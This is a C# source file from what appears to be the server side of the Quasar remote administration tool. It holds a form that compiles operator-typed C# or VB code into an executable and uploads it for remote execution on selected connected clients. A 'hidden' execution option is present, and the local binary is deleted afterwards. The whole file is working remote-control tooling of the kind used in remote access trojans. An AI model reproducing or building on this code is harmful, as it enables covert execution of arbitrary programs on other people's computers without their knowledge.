using Microsoft.CSharp;
using Microsoft.VisualBasic;
using Quasar.Common.IO;
using Quasar.Common.Messages;
using Quasar.Server.Messages;
using Quasar.Server.Models;
using Quasar.Server.Networking;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.ServiceModel.Dispatcher;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Server.Forms
{

    public partial class FrmExecuteCode : Form
    {

        Client[] clients;
        FrmRemoteExecution frmRe;
        string output;

        public FrmExecuteCode(Client[] clients)
        {
            InitializeComponent();
            this.clients = clients;
            fctbCSharp.Text = Properties.Resources.CodeExecutor_CSharp;
            fctbVB.Text = Properties.Resources.CodeExecutor_VB;
            Text += " [Selected: " + clients.Length + "]";
            frmRe = new FrmRemoteExecution(clients, 0);
            frmRe.ConfigureRemoteHandlers(clients);
        }

        private void btnResetCode_Click(object sender, System.EventArgs e)
        {
            switch (tcLanguage.SelectedIndex)
            {
                case 0: // C#
                    fctbCSharp.Text = Properties.Resources.CodeExecutor_CSharp;
                    break;
                case 1: // VB
                    fctbVB.Text = Properties.Resources.CodeExecutor_VB;
                    break;
            }
        }

        private void btnExecuteCode_Click(object sender, System.EventArgs e)
        {
            cbHidden.Enabled = false;
            btnExecuteCode.Enabled = false;
            lblStatus.Text = "Compiling...";
            new Thread(ExecuteThread).Start();
        }

        private void ExecuteThread()
        {

            // get output file
            output = new Random().Next(11111, 55555).ToString() + ".exe";

            // set output file
            output = Path.Combine(Directory.GetCurrentDirectory(), output);

            // call compile
            CompilerResults result = CompileCode(output);
            // check for errors
            if (result.Errors.Count > 0)
            {
                string message = "Found " + result.Errors.Count + " errors!\n\n";
                foreach (CompilerError error in result.Errors)
                {
                    message += "=== ERROR " + error.ErrorNumber + " ===\n";
                    message += "-- Line #" + error.Line + "\n";
                    message += error.ErrorText + "\n\n";
                }
                EndExecution(output, message);
                return;
            }

            // split file into pieces for transfer
            int clientNumber = 1;
            foreach (var handler in frmRe._remoteExecutionMessageHandlers)
            {

                Invoke((MethodInvoker)(() =>
                {
                    lblStatus.Text = "Uploading to client #" + clientNumber + "...";
                }));
                handler.FileHandler.BeginUploadFile(output);
                clientNumber++;

            }

            Thread.Sleep(TimeSpan.FromSeconds(1));
            EndExecution(output);
        }
        private void EndExecution(string file, string error = "")
        {
            Invoke((MethodInvoker)(() =>
            {
                if (File.Exists(file))
                {
                    while (true)
                    {
                        try
                        {
                            File.Delete(file);
                        }
                        catch
                        {
                            Thread.Sleep(TimeSpan.FromSeconds(1));
                            continue;
                        }
                        break;
                    }
                }
                    
                cbHidden.Enabled = true;
                btnExecuteCode.Enabled = true;
                lblStatus.Text = "Ready.";
                if (error != string.Empty)
                    MessageBox.Show(error, "Execution aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }));
        }

        private CompilerResults CompileCode(string outputPath)
        {

            // build references list
            int referenceCount = lbReferences.Items.Count;
            string[] references = new string[referenceCount];
            for (int i = 0; i < referenceCount; i++)
                references[i] = lbReferences.Items[i].ToString();

            // setup compiler params
            var parameters = new CompilerParameters(references, outputPath);
            parameters.GenerateExecutable = true;

            // compile
            int language = -1;
            Invoke((MethodInvoker)(() => { language = tcLanguage.SelectedIndex; }));
            switch (language)
            {
                case 0:
                    using (CSharpCodeProvider provider = new CSharpCodeProvider())
                        return provider.CompileAssemblyFromSource(parameters, new string[] { fctbCSharp.Text });
                case 1:
                    using (VBCodeProvider provider = new VBCodeProvider())
                        return provider.CompileAssemblyFromSource(parameters, new string[] { fctbVB.Text });
            }

            return null;

        }

        private void btnRemoveReference_Click(object sender, System.EventArgs e)
        {
            if (lbReferences.SelectedIndex != -1)
                lbReferences.Items.RemoveAt(lbReferences.SelectedIndex);
        }

        private void btnAddReference_Click(object sender, System.EventArgs e)
        {
            if (txtReference.Text != string.Empty)
                lbReferences.Items.Add(txtReference.Text);
        }

        private void FrmExecuteCode_FormClosing(object sender, FormClosingEventArgs e)
        {
            frmRe.Close();
        }
    }

}
